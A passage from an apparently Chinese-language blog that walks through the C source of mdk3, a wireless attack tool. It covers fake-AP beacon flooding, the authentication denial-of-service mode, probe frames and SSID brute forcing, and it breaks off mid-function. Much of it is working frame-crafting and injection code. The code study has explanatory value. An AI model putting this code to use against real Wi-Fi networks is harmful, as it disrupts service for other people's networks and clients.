<p>这些数据视情况写到要发送的数据包里面<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(gmode) &#123;</div><div class="line">	<span class="comment">//1-54 Mbit</span></div><div class="line">	<span class="built_in">memcpy</span>(&amp;param1, <span class="string">"\x01\x08\x82\x84\x8b\x96\x24\x30\x48\x6c\x03\x01"</span>, <span class="number">12</span>);</div><div class="line">	modelen = <span class="number">12</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span> &#123;</div><div class="line">	<span class="comment">//1-11 Mbit</span></div><div class="line">	<span class="built_in">memcpy</span>(&amp;param1, <span class="string">"\x01\x04\x82\x84\x8b\x96\x03\x01"</span>, <span class="number">8</span>);</div><div class="line">	modelen = <span class="number">8</span>;</div><div class="line">    &#125;</div></pre></td></tr></table></figure></p>
<p>这里根据是否使用54Mbit模式向param1写入不同信息，最后param1会写入要发送的数据包中<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//Getting SSID from file if file mode is in use</span></div><div class="line">    <span class="keyword">if</span> (advanced) &#123;</div><div class="line">	ssid = fakeap.ssid;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">	<span class="keyword">if</span> (!(ssid_file_name == <span class="literal">NULL</span>)) ssid = read_line_from_file();</div><div class="line">    &#125;</div><div class="line">    <span class="comment">//Need to generate SSID or is one given?</span></div><div class="line">    <span class="keyword">if</span> (ssid == <span class="literal">NULL</span>) ssid = generate_ssid();</div><div class="line">    slen = <span class="built_in">strlen</span>(ssid);</div><div class="line">    <span class="comment">//Checking SSID lenght</span></div><div class="line">    <span class="keyword">if</span> (slen&gt;<span class="number">32</span> &amp;&amp; showssidwarn1) &#123;</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"\rWARNING! Sending non-standard SSID &gt; 32 bytes\n"</span>);</div><div class="line">	showssidwarn1 = <span class="number">0</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (slen&gt;<span class="number">255</span>) &#123;</div><div class="line">	<span class="keyword">if</span> (showssidwarn2) &#123;</div><div class="line">	    <span class="built_in">printf</span>(<span class="string">"\rWARNING! Truncating overlenght SSID to 255 bytes!\n"</span>);</div><div class="line">	    showssidwarn2 = <span class="number">0</span>;</div><div class="line">	&#125;</div><div class="line">	slen = <span class="number">255</span>;</div><div class="line">    &#125;</div></pre></td></tr></table></figure></p>
<p>这里是生成fake ap的SSID，如果有指定就从文件中读取，如果没有就使用<code>generate_ssid()</code>函数随机生成，之后进行SSID合法性检查<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">// Setting up header</div><div class="line">    memcpy(pkt, hdr, 36);</div><div class="line">    // Set mode and WEP bit if wanted</div><div class="line">    if(adhoc) &#123;</div><div class="line">        if(wep) pkt[34]='\x12';</div><div class="line">        else pkt[34]='\x02';</div><div class="line">    &#125;</div><div class="line">    else &#123;</div><div class="line">        if(wep) pkt[34]='\x11';</div><div class="line">        else pkt[34]='\x01';</div><div class="line">    &#125;</div></pre></td></tr></table></figure></p>
<p>这里设置数据包头部，根据是否使用WEP模式来设置数据包中相应的数据<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// Set random mac</span></div><div class="line">    <span class="keyword">if</span> (advanced) &#123;</div><div class="line">	mac.data = (uchar *) fakeap.mac;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">	<span class="keyword">if</span> (random_mac) mac = generate_mac(<span class="number">0</span>);</div><div class="line">	    <span class="keyword">else</span> mac = generate_mac(<span class="number">2</span>);</div><div class="line">    &#125;</div></pre></td></tr></table></figure></p>
<p>这里是生成fake ap的MAC，如果有指定就从文件中读取，如果没有就使用<code>generate_mac()</code>函数随机生成<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"> <span class="built_in">memcpy</span>(pkt+<span class="number">10</span>, mac.data, ETH_MAC_LEN);</div><div class="line"> <span class="built_in">memcpy</span>(pkt+<span class="number">16</span>, mac.data, ETH_MAC_LEN);</div><div class="line"> <span class="comment">// Set SSID</span></div><div class="line"> pkt[<span class="number">37</span>] = (uchar) slen;</div><div class="line"> <span class="built_in">memcpy</span>(pkt+<span class="number">38</span>, ssid, slen);</div><div class="line"> <span class="comment">// Set Parameters 1</span></div><div class="line"> <span class="built_in">memcpy</span>(pkt+<span class="number">38</span>+slen, param1, modelen);</div><div class="line"> <span class="comment">// Set Channel</span></div><div class="line"> pkt[<span class="number">38</span>+slen+modelen] = chan;</div><div class="line"> <span class="comment">// Set Parameters 2</span></div><div class="line"> <span class="built_in">memcpy</span>(pkt+<span class="number">39</span>+slen+modelen, param2, <span class="number">14</span>);</div><div class="line"> <span class="comment">//Set WPA tag</span></div><div class="line"> <span class="keyword">if</span>(wep == <span class="number">2</span>) &#123;	<span class="comment">//If TKIP</span></div><div class="line">     <span class="built_in">memcpy</span>(pkt+<span class="number">53</span>+slen+modelen, wpatkip, <span class="number">26</span>);</div><div class="line">     modelen += <span class="number">26</span>;	<span class="comment">//Let's just reuse the variable from 'gmode'.</span></div><div class="line"> &#125;</div><div class="line"> <span class="keyword">else</span> <span class="keyword">if</span>(wep == <span class="number">3</span>) &#123;	<span class="comment">//If AES</span></div><div class="line">     <span class="built_in">memcpy</span>(pkt+<span class="number">53</span>+slen+modelen, wpaaes, <span class="number">26</span>);</div><div class="line">     modelen += <span class="number">26</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"> retn.data = pkt;</div><div class="line"> retn.len = slen+<span class="number">53</span>+modelen;</div><div class="line"></div><div class="line"> <span class="keyword">return</span> retn;</div></pre></td></tr></table></figure></p>
<p>设置数据包最后的容，根据需要指定加密模式，最后返回数据包给<code>parser()</code>函数<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* Sending packet, increase counters */</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> (frm.len &lt; <span class="number">10</span>) <span class="built_in">printf</span>(<span class="string">"WTF?!? Too small packet injection detected! BUG!!!\n"</span>);</div><div class="line">send_packet(frm.data, frm.len);</div><div class="line">nb_sent_ps++;</div><div class="line">nb_sent++;</div><div class="line"><span class="keyword">if</span> (useqosexploit) &#123; nb_sent_ps += <span class="number">3</span>; nb_sent += <span class="number">3</span>; &#125;	<span class="comment">//Yes, I know... too lazy.</span></div></pre></td></tr></table></figure></p>
<p>发送数据包 </p>
<h2 id="验证DOS攻击模式"><a href="#验证DOS攻击模式" class="headerlink" title="验证DOS攻击模式"></a>验证DOS攻击模式</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">case</span> <span class="string">'a'</span>:</div><div class="line">	mode = <span class="string">'a'</span>;</div><div class="line">	<span class="keyword">for</span> (t=<span class="number">3</span>; t&lt;argc; t++)</div><div class="line">	&#123;</div><div class="line">	    <span class="keyword">if</span> (! <span class="built_in">strcmp</span>(argv[t], <span class="string">"-a"</span>)) &#123;</div><div class="line">		  <span class="keyword">if</span> (! argc &gt; t+<span class="number">1</span>) &#123; <span class="built_in">printf</span>(use_auth); <span class="keyword">return</span> <span class="number">-1</span>; &#125;</div><div class="line">		  ap = (uchar *) parse_mac(argv[t+<span class="number">1</span>]);</div><div class="line">		  mode = <span class="string">'A'</span>;</div><div class="line">	    &#125;</div><div class="line">        <span class="keyword">if</span> (! <span class="built_in">strcmp</span>(argv[t], <span class="string">"-i"</span>)) &#123;</div><div class="line">		  <span class="keyword">if</span> (! argc &gt; t+<span class="number">1</span>) &#123; <span class="built_in">printf</span>(use_auth); <span class="keyword">return</span> <span class="number">-1</span>; &#125;</div><div class="line">		  target = (uchar *) parse_mac(argv[t+<span class="number">1</span>]);</div><div class="line">		  mode = <span class="string">'i'</span>;</div><div class="line">		  usespeed = <span class="number">1</span>; pps = <span class="number">500</span>;</div><div class="line">	    &#125;</div><div class="line">	    <span class="keyword">if</span> (! <span class="built_in">strcmp</span>(argv[t], <span class="string">"-c"</span>)) check = <span class="number">1</span>;</div><div class="line">	    <span class="keyword">if</span> (! <span class="built_in">strcmp</span>(argv[t], <span class="string">"-m"</span>)) random_mac = <span class="number">0</span>;</div><div class="line">	    <span class="keyword">if</span> (! <span class="built_in">strcmp</span>(argv[t], <span class="string">"-s"</span>)) <span class="keyword">if</span> (argc &gt; t+<span class="number">1</span>) &#123;</div><div class="line">		pps = strtol(argv[t+<span class="number">1</span>], (<span class="keyword">char</span> **) <span class="literal">NULL</span>, <span class="number">10</span>);</div><div class="line">		usespeed = <span class="number">1</span>;</div><div class="line">	    &#125;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">break</span>;</div></pre></td></tr></table></figure>
<p>这里可以看出我们可以设置是否指定特定的AP，是否要返回测试结果，发包频率等参数<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">case</span> <span class="string">'a'</span>:  <span class="comment">// Automated Auth DoS mode</span></div><div class="line">    <span class="keyword">if</span> ((nb_sent % <span class="number">512</span> == <span class="number">0</span>) || (total_time % <span class="number">30</span> == <span class="number">0</span>))  <span class="comment">// After 512 packets or 30 seconds, search for new target</span></div><div class="line">    &#123;</div><div class="line">    <span class="built_in">printf</span> (<span class="string">"\rTrying to get a new target AP...                  \n"</span>);</div><div class="line">    ap = get_target_ap();</div><div class="line">    &#125;</div><div class="line"><span class="keyword">case</span> <span class="string">'A'</span>:  <span class="comment">// Auth DoS mode with target MAC given</span></div><div class="line">    frm = create_auth_frame(ap, random_mac, <span class="literal">NULL</span>);</div><div class="line">    <span class="keyword">break</span>;</div></pre></td></tr></table></figure></p>
<p>这里就是验证DOS模式的主逻辑了，<code>get_target_ap()</code>获取目标， <code>create_auth_frame()</code>生成验证数据包,我们先看<code>get_target_ap()</code>函数<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line"><span class="function">uchar *<span class="title">get_target_ap</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line"><span class="comment">// Sniffing for beacon frames to find target APs</span></div><div class="line"><span class="comment">// Tries to to find NEW AP when called, saves already reported APs in aps_known[] array</span></div><div class="line"><span class="comment">// If it cannot find a new AP within 100 frames it either choses a random known AP</span></div><div class="line"><span class="comment">// or if no APs were ever found it keeps sniffing.</span></div><div class="line"></div><div class="line">    <span class="keyword">int</span> len = <span class="number">0</span>;</div><div class="line">    <span class="keyword">int</span> t, u, known;</div><div class="line">    uchar rnd;</div><div class="line"></div><div class="line">    keep_waiting: <span class="comment">// When nothing ever found this is called after the sniffing loop</span></div><div class="line"></div><div class="line">    <span class="keyword">for</span> (t=<span class="number">0</span>; t&lt;<span class="number">100</span>; t++)</div><div class="line">    &#123;</div><div class="line">	len = <span class="number">0</span>;</div><div class="line">	<span class="keyword">while</span> (len &lt; <span class="number">22</span>)</div><div class="line">	    len = read_packet(pkt_sniff, <span class="number">4096</span>);</div><div class="line">	known = <span class="number">0</span>;   <span class="comment">// Clear known flag</span></div><div class="line">	<span class="keyword">if</span> (! <span class="built_in">memcmp</span>(pkt_sniff, <span class="string">"\x80"</span>, <span class="number">1</span>)) &#123;   <span class="comment">//Filter: let only Beacon frames through</span></div><div class="line">	    <span class="keyword">for</span> (u=<span class="number">0</span>; u&lt;aps_known_count; u++)</div><div class="line">	    &#123;</div><div class="line">		<span class="keyword">if</span> (! <span class="built_in">memcmp</span>(aps_known[u], pkt_sniff+<span class="number">16</span>, <span class="number">6</span>)) &#123; </div><div class="line">		    known = <span class="number">1</span>; </div><div class="line">		    <span class="keyword">break</span>;</div><div class="line">		&#125;   <span class="comment">// AP known =&gt; Set known flag</span></div><div class="line">	    &#125;</div><div class="line">	    <span class="keyword">if</span> (! known)  <span class="comment">// AP is NEW, copy MAC to array and return it</span></div><div class="line">	    &#123;</div><div class="line">		<span class="built_in">memcpy</span>(aps_known[aps_known_count], pkt_sniff+<span class="number">16</span>, ETH_MAC_LEN);</div><div class="line">		aps_known_count++;</div><div class="line"></div><div class="line">		<span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">int</span>) aps_known_count &gt;=</div><div class="line">			<span class="keyword">sizeof</span> (aps_known) / <span class="keyword">sizeof</span> (aps_known[<span class="number">0</span>]) ) &#123;</div><div class="line">			<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"exceeded max aps_known\n"</span>);</div><div class="line">			<span class="built_in">exit</span> (<span class="number">1</span>);</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		<span class="keyword">return</span> pkt_sniff+<span class="number">16</span>;</div><div class="line">	    &#125;</div><div class="line">	&#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">// No new target found within 100 packets</span></div><div class="line">    <span class="comment">// If there are no beacons at all, wait for some to appear</span></div><div class="line">    <span class="keyword">if</span> (aps_known_count == <span class="number">0</span>)</div><div class="line">	<span class="keyword">goto</span> keep_waiting;</div><div class="line"></div><div class="line">    <span class="comment">// Pick random known AP to try once more</span></div><div class="line">    rnd = random() % aps_known_count;</div><div class="line"></div><div class="line">    <span class="keyword">return</span> (uchar *) aps_known[rnd];</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>这里可以发现，程序将读取数据包的第一个字节与<code>\x80</code>进行比较，可以发现这个位置的数据是用来标记数据包是否为信号数据包，<br>这里就是不断的读取数据寻找AP，其中<code>read_packet()</code>是来自osdep的一个API，mdk3和aircrack都是基于它开发的<br>这里是不断寻找新的AP，找到了就和已知的AP进行比对，如果已经存在就跳过，直到寻找到新的AP为止<br>现在来看一下<code>create_auth_frame()</code>函数，<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="function">struct pckt <span class="title">create_auth_frame</span><span class="params">(uchar *ap, <span class="keyword">int</span> random_mac, uchar *client_mac)</span></span></div><div class="line">&#123;</div><div class="line"><span class="comment">// Generating an authentication frame</span></div><div class="line"></div><div class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pckt</span> <span class="title">retn</span>;</span></div><div class="line">    <span class="keyword">char</span> *hdr = <span class="string">"\xb0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"</span></div><div class="line">		<span class="string">"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00"</span>;</div><div class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pckt</span> <span class="title">mac</span>;</span></div><div class="line"></div><div class="line">    <span class="built_in">memcpy</span>(pkt, hdr, <span class="number">31</span>);</div><div class="line">    <span class="comment">// Set target AP</span></div><div class="line">    <span class="built_in">memcpy</span>(pkt+<span class="number">4</span>, ap, ETH_MAC_LEN);</div><div class="line">    <span class="built_in">memcpy</span>(pkt+<span class="number">16</span>,ap, ETH_MAC_LEN);</div><div class="line">    <span class="comment">// Set client MAC</span></div><div class="line">    <span class="keyword">if</span> (client_mac == <span class="literal">NULL</span>) &#123;</div><div class="line">	<span class="keyword">if</span> (random_mac) mac = generate_mac(<span class="number">0</span>);</div><div class="line">	    <span class="keyword">else</span> mac = generate_mac(<span class="number">1</span>);</div><div class="line">	<span class="built_in">memcpy</span>(pkt+<span class="number">10</span>,mac.data,ETH_MAC_LEN);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">	<span class="built_in">memcpy</span>(pkt+<span class="number">10</span>,client_mac,ETH_MAC_LEN);</div><div class="line">    &#125;</div><div class="line">    retn.len = <span class="number">30</span>;</div><div class="line">    retn.data = pkt;</div><div class="line"></div><div class="line">    <span class="keyword">return</span> retn;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>这里其实就是简单的根据参数设置数据包的内容，和之前的beacon模式大同小异，最终生成的数据包会返回到<code>parser()</code>函数进行发包操作  </p>
<h2 id="探测AP及ESSID爆破"><a href="#探测AP及ESSID爆破" class="headerlink" title="探测AP及ESSID爆破"></a>探测AP及ESSID爆破</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">case</span> <span class="string">'p'</span>:</div><div class="line">    mac = generate_mac(<span class="number">1</span>);</div><div class="line">    frm = create_probe_frame(ssid, mac);</div><div class="line">    <span class="keyword">break</span>;</div><div class="line"><span class="keyword">case</span> <span class="string">'P'</span>:</div><div class="line">    <span class="keyword">if</span> (real_brute) &#123;</div><div class="line">    frm = ssid_brute_real();</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">    frm = ssid_brute();</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">break</span>;</div></pre></td></tr></table></figure>
<p>这里出现了两个分支，和上个模式一样根据参数决定，先看小写p代表的模式<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="function">struct pckt <span class="title">create_probe_frame</span><span class="params">(<span class="keyword">char</span> *ssid, struct pckt mac)</span></span></div><div class="line">&#123;</div><div class="line"><span class="comment">// Generating Probe Frame</span></div><div class="line"></div><div class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pckt</span> <span class="title">retn</span>;</span></div><div class="line">    <span class="keyword">char</span> *hdr = <span class="string">"\x40\x00\x00\x00\xff\xff\xff\xff\xff\xff"</span>;</div><div class="line">    <span class="keyword">char</span> *bcast = <span class="string">"\xff\xff\xff\xff\xff\xff"</span>;</div><div class="line">    <span class="keyword">char</span> *seq = <span class="string">"\x00\x00\x00"</span>;</div><div class="line">    <span class="keyword">char</span> *rates = <span class="string">"\x01\x04\x82\x84\x8b\x96"</span>;</div><div class="line">    <span class="keyword">int</span> slen;</div><div class="line"></div><div class="line">    slen = <span class="built_in">strlen</span>(ssid);</div><div class="line"></div><div class="line">    <span class="built_in">memcpy</span>(pkt, hdr, <span class="number">10</span>);</div><div class="line">    <span class="comment">// MAC which is probing</span></div><div class="line">    <span class="built_in">memcpy</span>(pkt+<span class="number">10</span>, mac.data, ETH_MAC_LEN);</div><div class="line">    <span class="comment">// Destination: Broadcast</span></div><div class="line">    <span class="built_in">memcpy</span>(pkt+<span class="number">16</span>, bcast, ETH_MAC_LEN);</div><div class="line">    <span class="comment">// Sequence</span></div><div class="line">    <span class="built_in">memcpy</span>(pkt+<span class="number">22</span>, seq, <span class="number">3</span>);</div><div class="line">    <span class="comment">// SSID</span></div><div class="line">    pkt[<span class="number">25</span>] = slen;</div><div class="line">    <span class="built_in">memcpy</span>(pkt+<span class="number">26</span>, ssid, slen);</div><div class="line">    <span class="comment">// Supported Bitrates (1, 2, 5.5, 11 MBit)</span></div><div class="line">    <span class="built_in">memcpy</span>(pkt+<span class="number">26</span>+slen, rates, ETH_MAC_LEN);</div><div class="line"></div><div class="line">    retn.data = pkt;</div><div class="line">    retn.len = <span class="number">26</span> + slen + ETH_MAC_LEN;</div><div class="line"></div><div class="line">    <span class="keyword">return</span> retn;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>同样的，这里设置了要发送的数据包内容，mac地址随机生成，需要探测的SSID则由用户给出<br>现在来看大写P的模式，另一个模式用于爆破可能存在的SSID,现在看看对应函数<code>ssid_brute_real()</code>的代码<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (state == <span class="number">0</span>) &#123;</div><div class="line"><span class="comment">//state0</span></div><div class="line"><span class="comment">//- SPAWN Sniffer thread</span></div><div class="line">	pthread_create( &amp;sniffer, <span class="literal">NULL</span>, (<span class="keyword">void</span> *) ssid_brute_sniffer, (<span class="keyword">void</span> *) <span class="number">1</span>);</div><div class="line"><span class="comment">//- sniff beacon frame from target / do nothin if target==NULL</span></div><div class="line">	<span class="keyword">if</span> (target != <span class="literal">NULL</span>) &#123;</div><div class="line">	    pkt = get_target_ssid();</div><div class="line"><span class="comment">//- set lenght variable</span></div><div class="line">	    ssid_len = pkt.len;</div><div class="line"></div><div class="line">	    <span class="keyword">if</span> ((ssid_len == <span class="number">1</span>) || (ssid_len == <span class="number">0</span>)) &#123;</div><div class="line">		ssid_len = <span class="number">1</span>;    <span class="comment">//Compensate 0 and 1-byte placeholder SSIDs as maximum len</span></div><div class="line">		unknown_len = <span class="number">1</span>;</div><div class="line">	    &#125;</div><div class="line"><span class="comment">//- set state1</span></div><div class="line">	    state = <span class="number">1</span>;</div><div class="line"><span class="comment">//-&gt; return probe packet using the SSID supplied by beacon frame</span></div><div class="line">	    <span class="keyword">return</span> create_probe_frame((<span class="keyword">char</span> *)pkt.data, generate_mac(<span class="number">1</span>));</div><div class="line">	&#125;</div><div class="line"><span class="comment">//- In untargetted mode, continue</span></div><div class="line">	state = <span class="number">1</span>;</div><div class="line">    &#125;</div></pre></td></tr></table></figure></p>
<p>这里先是开启了新的线程，调用<code>ssid_brute_sniffer()</code>函数探测可能存在的SSID<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line">void ssid_brute_sniffer()</div><div class="line">&#123;</div><div class="line">    printf("Sniffer thread started\n");</div><div class="line">    int len=0;</div><div class="line">    int i;</div><div class="line">    int no_disp;</div><div class="line">//infinite loop</div><div class="line">    while (1) &#123;</div><div class="line">//sniff packet</div><div class="line">	len = read_packet(pkt_check, MAX_PACKET_LENGTH);</div><div class="line">//is probe response?</div><div class="line">	if (! memcmp(pkt_check, "\x50", 1)) &#123;</div><div class="line">//parse + print response</div><div class="line">	    uchar *mac = pkt_check+16;</div><div class="line">	    uchar slen = pkt_check[37];</div><div class="line">	    pkt_check[38+slen] = '\x00';</div><div class="line">	    no_disp = 0;</div><div class="line">	    for (i=0; i&lt;aps_known_count; i++) &#123;</div><div class="line">		if (!memcmp(aps_known[i], mac, ETH_MAC_LEN)) no_disp = 1;</div><div class="line">	    &#125;</div><div class="line">	    if (!exit_now &amp;&amp; !no_disp) &#123;</div><div class="line">		printf("\nGot response from %02X:%02X:%02X:%02X:%02X:%02X, SSID: \"%s\"\n", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5], pkt_check+38);</div><div class="line">		printf("Last try was: %s\n", brute_ssid);</div><div class="line">	    &#125;</div><div class="line">	    if (!no_disp) &#123;</div><div class="line">		memcpy(aps_known[aps_known_count], mac, ETH_MAC_LEN);</div><div class="line">		aps_known_count++;</div><div class="line">		if ((unsigned int) aps_known_count &gt;=</div><div class="line">			sizeof (aps_known) / sizeof (aps_known[0]) ) &#123;</div><div class="line">			fprintf(stderr, "exceeded max aps_known\n");</div><div class="line">			exit (1);</div><div class="line">		&#125;</div><div class="line">	    &#125;</div><div class="line">//If response is from target, exit mdk3</div><div class="line">	    if (target != NULL) &#123; </div><div class="line">		if (!memcmp(pkt_check+16, target, ETH_MAC_LEN)) &#123;</div><div class="line">		    exit_now = 1;</div><div class="line">		&#125;</div><div class="line">	    &#125;</div><div class="line">	&#125;</div><div class="line">//loop</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>对应函数<code>ssid_brute_real()</code>的另一部分<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (state == <span class="number">1</span>) &#123;</div><div class="line"><span class="comment">//state1</span></div><div class="line"><span class="comment">//- get SSID to probe for</span></div><div class="line">	bruteforce_ssid();</div><div class="line">	ssid = brute_ssid;</div><div class="line"><span class="comment">//- Stop work if last SSID is generated and sent</span></div><div class="line">	<span class="keyword">if</span> (end) &#123;</div><div class="line">	    <span class="keyword">if</span> (unknown_len) &#123;</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"\nAll %d possible SSIDs with length %d sent, trying length %d.\n"</span>, turns<span class="number">-1</span>, ssid_len, ssid_len+<span class="number">1</span>);</div><div class="line">		end = <span class="number">0</span>; turns = <span class="number">0</span>; <span class="comment">//Resetting bruteforce counters, trying one byte more</span></div><div class="line">	